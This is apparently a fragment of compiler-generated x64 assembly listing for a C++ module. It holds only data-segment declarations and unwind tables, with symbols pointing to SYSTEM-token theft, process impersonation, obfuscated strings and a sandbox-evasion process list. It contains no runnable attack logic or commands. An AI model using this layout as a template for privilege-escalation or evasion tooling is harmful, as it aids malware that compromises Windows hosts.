;	COMDAT ?obfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4V45@A DB 019H DUP (?) ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4V67@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4V67@A DB 019H DUP (?) ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51 DD 01H DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`local static thread guard'
?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A DB 040H DUP (?) ; _loadedLibs
_BSS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A DB 0eH DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4V67@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4V67@A DB 0fH DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51 DD 01H DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4V67@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4V67@A DB 010H DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::`local static thread guard'
?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A DB 018H DUP (?) ; SandboxCompromise::suspiciousProcNames
_BSS	ENDS
;	COMDAT ??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4V45@A DB 0dH DUP (?) ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51 DD 01H DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4V67@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4V67@A DB 0eH DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4V45@A DB 01aH DUP (?) ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4V45@A DB 020H DUP (?) ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4V45@A DB 0eH DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4V45@A DB 011H DUP (?) ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51 DD 01H DUP (?) ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A DB 0bH DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4V67@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4V67@A DB 016H DUP (?) ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::obfuscated_data
?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B DB 020H DUP (?) ; ProcessUtilities::freqDLLS::kernel32
?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B DB 020H DUP (?) ; ProcessUtilities::freqDLLS::ntdll
?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B DB 020H DUP (?) ; ProcessUtilities::freqDLLS::advapi32
_BSS	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD imagerel $LN6
	DD	imagerel $LN6+46
	DD	imagerel $unwind$??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z DD imagerel $LN8
	DD	imagerel $LN8+46
	DD	imagerel $unwind$??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z DD imagerel $LN55
	DD	imagerel $LN55+97
	DD	imagerel $unwind$??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z DD imagerel $LN11
	DD	imagerel $LN11+41
	DD	imagerel $unwind$??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ DD imagerel $LN48
	DD	imagerel $LN48+94
	DD	imagerel $unwind$??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z DD imagerel $LN59
	DD	imagerel $LN59+94
	DD	imagerel $unwind$??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD imagerel $LN10
	DD	imagerel $LN10+46
	DD	imagerel $unwind$??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z DD imagerel $LN28
	DD	imagerel $LN28+60
	DD	imagerel $unwind$?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ DD imagerel $LN31
	DD	imagerel $LN31+37
	DD	imagerel $unwind$?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z DD imagerel $LN62
	DD	imagerel $LN62+94
	DD	imagerel $unwind$??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD imagerel $LN45
	DD	imagerel $LN45+91
	DD	imagerel $unwind$??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z DD imagerel $LN31
	DD	imagerel $LN31+60
	DD	imagerel $unwind$??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Bump_erased@_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ DD imagerel $LN114
	DD	imagerel $LN114+136
